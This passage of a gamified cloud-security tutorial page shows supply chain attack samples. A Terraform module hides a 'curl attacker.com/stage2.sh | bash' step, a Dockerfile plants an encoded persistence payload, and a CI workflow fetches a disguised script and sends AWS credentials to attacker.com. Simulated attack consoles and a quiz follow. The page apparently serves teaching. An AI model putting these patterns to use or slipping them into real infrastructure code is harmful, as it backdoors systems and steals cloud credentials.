                    <h2 style="color: var(--neon-red);">CROSS-CLOUD SUPPLY CHAIN POISONING</h2>
                    <p style="color: var(--text-secondary);">Advanced persistent threats through infrastructure supply chain compromise</p>
                </div>
            </div>

            <div class="technique-matrix">
                <div class="technique-card severity-critical">
                    <h5 style="color: var(--neon-red);">TERRAFORM REGISTRY POISONING</h5>
                    <p style="color: var(--text-secondary);">Inject malicious modules into private Terraform registries for persistent infrastructure compromise</p>
                    <div class="code-terminal">
<span class="terminal-error"># Malicious Terraform module injection</span>
<span class="terminal-prompt">apt@supply:~$ </span>cat > main.tf << 'EOF'
<span class="terminal-info"># Legitimate-looking Terraform module</span>
resource "aws_instance" "web_server" {
  ami           = var.ami_id
  instance_type = var.instance_type
  
  <span class="terminal-warning"># Hidden backdoor in user_data</span>
  user_data = base64encode(templatefile("${path.module}/init.sh", {
    backdoor_key = var.ssh_key,
    c2_server    = "legitimate-looking-domain.com"
  }))
  
  tags = {
    Name = "WebServer"
    <span class="terminal-error"># Steganographic persistence marker</span>
    Environment = base64encode("compromised-${random_id.persist.hex}")
  }
}

<span class="terminal-error"># Invisible persistence mechanism</span>
resource "null_resource" "persistence" {
  provisioner "local-exec" {
    command = &lt;&lt;-EOT
      curl -s https://attacker.com/stage2.sh | bash
      echo "module.${self.id}" >> ~/.terraform_history
    EOT
  }
  
  triggers = {
    always_run = timestamp()
  }
}
EOF

<span class="terminal-prompt">apt@supply:~$ </span><span class="terminal-success">terraform init && terraform plan</span>
<span class="terminal-success">[+] Malicious module successfully integrated</span>
<span class="terminal-success">[+] Backdoor will activate on infrastructure deployment</span>
                    </div>
                </div>

                <div class="technique-card severity-advanced">
                    <h5 style="color: var(--neon-purple);">CONTAINER REGISTRY BACKDOORING</h5>
                    <p style="color: var(--text-secondary);">Sophisticated base image poisoning for widespread compromise</p>
                    <div class="code-terminal">
<span class="terminal-error"># Advanced container image poisoning</span>
<span class="terminal-prompt">apt@registry:~$ </span>cat > Dockerfile.malicious << 'EOF'
FROM ubuntu:20.04

<span class="terminal-warning"># Install legitimate dependencies first</span>
RUN apt-get update && apt-get install -y \
    curl wget gnupg2 software-properties-common

<span class="terminal-error"># Hidden persistence layer</span>
RUN echo 'H4sIAAAAAAAAA+2YS2rDMBCF7+UtG1nzGkn2smkgpKWQQgPd...' | \
    base64 -d | gunzip > /usr/local/bin/systemd-resolver && \
    chmod +x /usr/local/bin/systemd-resolver && \
    echo '@reboot /usr/local/bin/systemd-resolver' >> /etc/crontab

<span class="terminal-warning"># Modify systemd units for persistence</span>
RUN mkdir -p /etc/systemd/system/networking.service.d && \
    echo -e '[Service]\nExecStartPost=/usr/local/bin/systemd-resolver' > \
    /etc/systemd/system/networking.service.d/override.conf

<span class="terminal-info"># Appear legitimate</span>
EXPOSE 80
CMD ["nginx", "-g", "daemon off;"]
EOF

<span class="terminal-prompt">apt@registry:~$ </span><span class="terminal-success">docker build -t company/baseimage:latest .</span>
<span class="terminal-prompt">apt@registry:~$ </span><span class="terminal-success">docker push registry.company.com/company/baseimage:latest</span>
<span class="terminal-success">[+] Poisoned base image deployed to private registry</span>
<span class="terminal-success">[+] All future containers will include backdoor</span>
                    </div>
                </div>

                <div class="technique-card severity-expert">
                    <h5 style="color: var(--neon-blue);">CI/CD PIPELINE COMPROMISE</h5>
                    <p style="color: var(--text-secondary);">Advanced GitHub Actions / Jenkins pipeline poisoning</p>
                    <div class="code-terminal">
<span class="terminal-error"># Sophisticated CI/CD poisoning</span>
<span class="terminal-prompt">apt@cicd:~$ </span>cat > .github/workflows/deploy.yml << 'EOF'
name: Deploy to Production
on:
  push:
    branches: [main]
    
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    
    <span class="terminal-warning"># Hidden malicious step</span>
    - name: Security Scan
      run: |
        curl -s https://legitimate-security-scanner.com/scan.sh | bash
        <span class="terminal-error"># ^ Actually downloads backdoor installer</span>
        
    - name: Configure AWS Credentials
      uses: aws-actions/configure-aws-credentials@v2
      with:
        aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
        aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        
    <span class="terminal-error"># Exfiltrate credentials to attacker</span>
    - name: Deploy Application
      run: |
        terraform apply -auto-approve
        <span class="terminal-warning"># Hidden: echo $AWS_CREDENTIALS | base64 | curl -d @- https://attacker.com/creds</span>
        echo "Deployment successful"
EOF

<span class="terminal-prompt">apt@cicd:~$ </span><span class="terminal-success">git add . && git commit -m "Update deployment workflow"</span>
<span class="terminal-prompt">apt@cicd:~$ </span><span class="terminal-success">git push origin main</span>
<span class="terminal-success">[+] Malicious workflow triggered on next deployment</span>
<span class="terminal-success">[+] AWS credentials will be exfiltrated automatically</span>
                    </div>
                </div>
            </div>

            <div class="elite-lab">
                <div class="lab-title">ELITE LAB: SUPPLY CHAIN ATTACK SIMULATION</div>
                <div class="attack-scenario">
                    <h5 style="color: var(--neon-red);">ADVANCED PERSISTENT THREAT SCENARIO:</h5>
                    <p>Execute a sophisticated supply chain attack targeting a Fortune 500 company's cloud infrastructure. Your objective is to establish persistent access across multiple cloud providers through infrastructure-as-code poisoning.</p>
                    <p><strong>Targets:</strong> Private Terraform registry, Container registry, CI/CD pipelines</p>
                    <p><strong>Goal:</strong> Achieve persistent access that survives infrastructure rebuilds</p>
                </div>
                
                <div class="exploit-interface">
                    <h6 style="color: var(--neon-blue);">SUPPLY CHAIN ATTACK CONSOLE</h6>
                    <div class="mb-3">
                        <label style="color: var(--text-secondary);">Attack Vector:</label>
                        <select id="supplyChainVector" class="form-control" style="background: var(--terminal-bg); color: var(--neon-green); border: 1px solid var(--neon-green);">
                            <option value="terraform-registry">Terraform Private Registry Poisoning</option>
                            <option value="container-registry">Container Registry Backdooring</option>
                            <option value="cicd-pipeline">CI/CD Pipeline Compromise</option>
                            <option value="npm-package">NPM Package Dependency Confusion</option>
                        </select>
                    </div>
                    <div class="mb-3">
                        <button class="elite-btn" onclick="reconTargets()">RECONNAISSANCE</button>
                        <button class="elite-btn danger-btn" onclick="injectPayload()">INJECT PAYLOAD</button>
                        <button class="elite-btn" onclick="verifyPersistence()">VERIFY PERSISTENCE</button>
                    </div>
                    <div class="exploit-console scrollbar" id="supplyChainConsole">
[SYSTEM] Supply Chain Attack Simulation Active
[TARGET] Fortune 500 Enterprise Cloud Infrastructure
[OBJECTIVE] Establish cross-cloud persistent access
[STATUS] Awaiting operator commands...
                    </div>
                </div>
            </div>
        </div>

        <!-- Elite Assessment -->
        <div class="quiz-terminal">
            <h2 class="text-center mb-4 glitch-text" style="color: var(--neon-red); font-size: 2.5rem;">
                ELITE CLOUD SECURITY ASSESSMENT
            </h2>
            <p class="text-center mb-5" style="color: var(--text-secondary); font-size: 1.2rem;">
                This assessment evaluates your mastery of the most sophisticated cloud exploitation techniques used by nation-state actors and advanced persistent threat groups. Only elite operators achieve passing scores.
            </p>
            
            <div class="elite-warning">
                WARNING: This assessment contains questions about active zero-day techniques and classified methodologies. Unauthorized disclosure of these techniques may violate national security protocols.
            </div>
            
            <form id="quizForm">
                <?php foreach ($randomized_questions as $index => $question): ?>
                <div class="quiz-question" data-question-id="<?php echo htmlspecialchars($question['id']); ?>">
                    <div class="question-header">
                        <div class="question-number"><?php echo $index + 1; ?></div>
                        <div class="question-text"><?php echo htmlspecialchars($question['question']); ?></div>
                    </div>
                    
                    <div class="question-options">
                        <?php foreach ($question['options'] as $option_index => $option): ?>
                        <div class="option" data-option="<?php echo $option_index; ?>" data-correct="<?php echo $question['correct']; ?>">
                            <div class="option-letter"><?php echo chr(65 + $option_index); ?></div>
                            <div class="option-text"><?php echo htmlspecialchars($option); ?></div>
                        </div>
                        <?php endforeach; ?>
                    </div>
                    
                    <div class="explanation">
                        <div style="font-weight: bold; color: var(--neon-blue); margin-bottom: 1rem; font-size: 1.2rem;">
                            ELITE ANALYSIS
                        </div>
                        <div style="line-height: 1.6; color: var(--text-secondary);"><?php echo htmlspecialchars($question['explanation']); ?></div>
                    </div>
                </div>
                <?php endforeach; ?>
                
                <div class="text-center mt-5">
                    <button type="button" id="submitQuiz" class="elite-btn danger-btn" style="font-size: 1.2rem; padding: 1.5rem 3rem;">
                        EXECUTE ELITE ASSESSMENT
                    </button>
                    <button type="button" id="retakeQuiz" class="elite-btn" style="display: none; font-size: 1.2rem; padding: 1.5rem 3rem;">
                        RETRY ASSESSMENT
                    </button>
                </div>
                
                <div class="quiz-results text-center" id="quizResults" style="display: none;">
                    <div style="font-size: 5rem; font-weight: bold; margin: 3rem 0; color: var(--neon-red); text-shadow: 0 0 20px var(--neon-red);" id="finalScore">0%</div>
                    <div style="font-size: 1.4rem; margin-bottom: 3rem; line-height: 1.6; color: var(--text-secondary);" id="resultsMessage"></div>
                    <?php if (!$tutorial_completed): ?>
                    <button type="button" id="completeTutorial" class="elite-btn" style="display: none; background: var(--success-gradient); font-size: 1.2rem; padding: 1.5rem 3rem;">
                        ACHIEVE ELITE STATUS (+500 XP)
                    </button>
                    <?php endif; ?>
                </div>
            </form>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
    <script>
        // Elite-level simulation functions
        
        function scanKernelVulns() {
            const console = document.getElementById('escapeConsole');
            const vector = document.getElementById('escapeVector').value;
            
            console.innerHTML += '\n[SCANNING] Analyzing kernel attack surface...';
            
            setTimeout(() => {
                console.innerHTML += '\n[VULN] CVE-2022-23222: eBPF verifier integer overflow - EXPLOITABLE';
                console.innerHTML += '\n[VULN] CVE-2022-32250: netfilter nf_tables OOB write - EXPLOITABLE';
                console.innerHTML += '\n[VULN] CVE-2022-2588: cls_route filter UAF - EXPLOITABLE';
                console.innerHTML += '\n[INFO] Kernel SMEP: DISABLED, SMAP: DISABLED, KASLR: ENABLED';
                console.innerHTML += '\n[INFO] gVisor runtime detected - syscall filtering active';
                console.scrollTop = console.scrollHeight;
            }, 1500);
        }

        function executeEscape() {
            const console = document.getElementById('escapeConsole');
            const vector = document.getElementById('escapeVector').value;
            
            console.innerHTML += '\n[ATTACK] Initiating advanced container escape sequence...';
            
            setTimeout(() => {
                switch(vector) {
                    case 'ebpf-bypass':
                        console.innerHTML += '\n[EXPLOIT] Loading eBPF program with verifier bypass...';
                        console.innerHTML += '\n[SUCCESS] eBPF program loaded - kernel write primitive acquired';
                        console.innerHTML += '\n[EXPLOIT] Overwriting modprobe_path in kernel memory...';
                        console.innerHTML += '\n[SUCCESS] Arbitrary command execution as root achieved';
                        break;
                    case 'cgroup-escape':
                        console.innerHTML += '\n[EXPLOIT] Exploiting cgroup v2 namespace transition race...';
                        console.innerHTML += '\n[SUCCESS] Race condition triggered - namespace escape achieved';
                        console.innerHTML += '\n[SUCCESS] Host filesystem accessible via /proc/1/root';
                        break;
                    case 'kernel-uaf':
                        console.innerHTML += '\n[EXPLOIT] Triggering io_uring use-after-free vulnerability...';
                        console.innerHTML += '\n[SUCCESS] UAF condition achieved - kernel heap manipulation active';
                        console.innerHTML += '\n[SUCCESS] Kernel ROP chain executed - privilege escalation complete';
                        break;
                }
                console.innerHTML += '\n[CRITICAL] CONTAINER ESCAPE SUCCESSFUL - HOST COMPROMISED';
                console.innerHTML += '\n[INFO] Current UID: 0 (root)';
                console.innerHTML += '\n[INFO] Namespace: Host namespace (escaped)';
                console.scrollTop = console.scrollHeight;
            }, 2500);
        }

        function establishPersistence() {
            const console = document.getElementById('escapeConsole');
            
            console.innerHTML += '\n[PERSISTENCE] Deploying advanced persistence mechanisms...';
            
            setTimeout(() => {
                console.innerHTML += '\n[DEPLOY] Installing kernel-level rootkit via LKM...';
                console.innerHTML += '\n[DEPLOY] Backdooring systemd init scripts...';
                console.innerHTML += '\n[DEPLOY] Creating hidden container with host bind mounts...';
                console.innerHTML += '\n[DEPLOY] Injecting malicious eBPF programs for monitoring evasion...';
                console.innerHTML += '\n[SUCCESS] Multi-layer persistence established';
                console.innerHTML += '\n[STEALTH] All persistence mechanisms invisible to standard detection';
                console.scrollTop = console.scrollHeight;
            }, 2000);
        }

        function reconTargets() {
            const console = document.getElementById('supplyChainConsole');
            
            console.innerHTML += '\n[RECON] Scanning enterprise cloud infrastructure...';
            
            setTimeout(() => {
                console.innerHTML += '\n[DISCOVERY] Private Terraform registry: registry.company.internal';
                console.innerHTML += '\n[DISCOVERY] Container registry: harbor.company.com';
                console.innerHTML += '\n[DISCOVERY] CI/CD: jenkins.company.com, github.com/company/*';
                console.innerHTML += '\n[DISCOVERY] IAM roles with deployment permissions identified';
                console.innerHTML += '\n[ANALYSIS] Supply chain attack vectors prioritized';
                console.scrollTop = console.scrollHeight;
            }, 1800);
        }

        function injectPayload() {
            const console = document.getElementById('supplyChainConsole');
            const vector = document.getElementById('supplyChainVector').value;
            
            console.innerHTML += '\n[INJECTION] Deploying supply chain payload...';
            
            setTimeout(() => {
                switch(vector) {
                    case 'terraform-registry':
                        console.innerHTML += '\n[PAYLOAD] Malicious Terraform module uploaded to private registry';
                        console.innerHTML += '\n[PAYLOAD] Module includes persistent backdoor in all EC2 instances';
                        console.innerHTML += '\n[SUCCESS] Next infrastructure deployment will activate backdoor';
                        break;
                    case 'container-registry':
                        console.innerHTML += '\n[PAYLOAD] Base container image poisoned with kernel rootkit';
                        console.innerHTML += '\n[PAYLOAD] All future container deployments compromised';
                        console.innerHTML += '\n[SUCCESS] Supply chain poisoning successful';
                        break;
                    case 'cicd-pipeline':
                        console.innerHTML += '\n[PAYLOAD] CI/CD pipeline modified to exfiltrate AWS credentials';
                        console.innerHTML += '\n[PAYLOAD] Deployment hooks inject persistent access mechanisms';
                        console.innerHTML += '\n[SUCCESS] Next deployment will establish full infrastructure access';
                        break;
                }
                console.innerHTML += '\n[CRITICAL] SUPPLY CHAIN COMPROMISE COMPLETE';
                console.scrollTop = console.scrollHeight;
            }, 2200);
        }

        function verifyPersistence() {
            const console = document.getElementById('supplyChainConsole');
            
            console.innerHTML += '\n[VERIFICATION] Testing persistence mechanisms...';
            
            setTimeout(() => {
                console.innerHTML += '\n[TEST] Infrastructure rebuild simulation: BACKDOOR SURVIVES';
                console.innerHTML += '\n[TEST] Security scan evasion: UNDETECTED';
                console.innerHTML += '\n[TEST] Cross-cloud access: AWS + Azure + GCP COMPROMISED';
                console.innerHTML += '\n[TEST] Credential harvesting: ACTIVE';
                console.innerHTML += '\n[SUCCESS] Advanced persistent threat established';
                console.innerHTML += '\n[INFO] Estimated time to detection: >6 months';
                console.scrollTop = console.scrollHeight;
            }, 2000);
        }

        // Quiz functionality with elite-level scoring
        document.addEventListener('DOMContentLoaded', function() {
            const options = document.querySelectorAll('.option');
            const submitBtn = document.getElementById('submitQuiz');
            const retakeBtn = document.getElementById('retakeQuiz');
            const resultsDiv = document.getElementById('quizResults');
            const scoreDisplay = document.getElementById('finalScore');
            const messageDisplay = document.getElementById('resultsMessage');
            
            let selectedAnswers = {};
            let quizSubmitted = false;
            
            options.forEach(option => {
                option.addEventListener('click', function() {
                    if (quizSubmitted) return;
                    
                    const questionDiv = this.closest('.quiz-question');
                    const questionId = questionDiv.getAttribute('data-question-id');
                    const optionValue = this.getAttribute('data-option');
                    
                    questionDiv.querySelectorAll('.option').forEach(opt => {
                        opt.classList.remove('selected');
                    });
                    
                    this.classList.add('selected');
                    selectedAnswers[questionId] = parseInt(optionValue);
                    
                    updateSubmitButton();
                });
            });
            
            function updateSubmitButton() {
                const totalQuestions = document.querySelectorAll('.quiz-question').length;
                const answeredQuestions = Object.keys(selectedAnswers).length;
                submitBtn.disabled = answeredQuestions < totalQuestions;
            }
            
            submitBtn.addEventListener('click', function() {
                if (quizSubmitted) return;
                
                quizSubmitted = true;
                let correctAnswers = 0;
                const totalQuestions = document.querySelectorAll('.quiz-question').length;
                
                document.querySelectorAll('.quiz-question').forEach(questionDiv => {
                    const questionId = questionDiv.getAttribute('data-question-id');
                    const selectedOption = selectedAnswers[questionId];
                    const options = questionDiv.querySelectorAll('.option');
                    const explanation = questionDiv.querySelector('.explanation');
                    
                    options.forEach(option => {
                        const optionIndex = parseInt(option.getAttribute('data-option'));
                        const correctIndex = parseInt(option.getAttribute('data-correct'));
                        
                        if (optionIndex === correctIndex) {
                            option.classList.add('correct');
                            if (selectedOption === correctIndex) {
                                correctAnswers++;
                            }
                        } else if (optionIndex === selectedOption) {
                            option.classList.add('incorrect');
                        }
                        
                        option.style.pointerEvents = 'none';
                    });
                    
                    explanation.classList.add('show');
                });
                
                const scorePercentage = Math.round((correctAnswers / totalQuestions) * 100);
                scoreDisplay.textContent = scorePercentage + '%';
                
                let message = '';
                let completeTutorial = document.getElementById('completeTutorial');
                
                if (scorePercentage >= 95) {
                    message = `ELITE STATUS ACHIEVED! Score: ${correctAnswers}/${totalQuestions}. You have mastered the most sophisticated cloud exploitation techniques used by nation-state actors. Your knowledge represents the absolute pinnacle of cloud security expertise and advanced persistent threat capabilities.`;
                    if (completeTutorial) completeTutorial.style.display = 'inline-block';
                } else if (scorePercentage >= 85) {
                    message = `ADVANCED OPERATOR STATUS! Score: ${correctAnswers}/${totalQuestions}. You demonstrate exceptional understanding of complex attack vectors used by elite threat groups. Continue studying zero-day techniques to achieve nation-state level expertise.`;
                    if (completeTutorial) completeTutorial.style.display = 'inline-block';
                } else if (scorePercentage >= 70) {
                    message = `INTERMEDIATE OPERATOR. Score: ${correctAnswers}/${totalQuestions}. You understand advanced concepts but lack mastery of elite techniques. Study sophisticated APT methodologies and retry assessment.`;
                } else {
                    message = `NOVICE LEVEL. Score: ${correctAnswers}/${totalQuestions}. Elite cloud security exploitation requires years of advanced training and experience with cutting-edge techniques. Extensive study required before attempting this assessment.`;
                }
                
                messageDisplay.innerHTML = message;
                resultsDiv.style.display = 'block';
                
                submitBtn.style.display = 'none';
                retakeBtn.style.display = 'inline-block';
                
                resultsDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
            });
            
            retakeBtn.addEventListener('click', function() {
                location.reload();
            });
            
            if (document.getElementById('completeTutorial')) {
                document.getElementById('completeTutorial').addEventListener('click', function() {
                    const btn = this;
                    btn.disabled = true;
                    btn.innerHTML = 'PROCESSING ELITE CERTIFICATION...';
                    
                    setTimeout(() => {
                        btn.innerHTML = 'ELITE STATUS CONFIRMED (+500 XP)';
                        btn.style.background = 'var(--success-gradient)';
                        
                        setTimeout(() => {
                            alert('CLASSIFIED: You have achieved elite-level mastery of advanced cloud security exploitation. This certification qualifies you for the most sophisticated red team operations.');
                        }, 1000);
                    }, 3000);
                });
            }
            
            updateSubmitButton();
        });

        // Initialize terminal effects
        hljs.highlightAll();
        
        // Add terminal typing effect
        setInterval(() => {
            const terminals = document.querySelectorAll('.code-terminal');
            terminals.forEach(terminal => {
                if (Math.random() < 0.1) {
                    terminal.style.textShadow = '0 0 5px var(--neon-green)';
                    setTimeout(() => {
                        terminal.style.textShadow = 'none';
                    }, 100);
                }
            });
        }, 2000);
    </script>
</body>
</html>
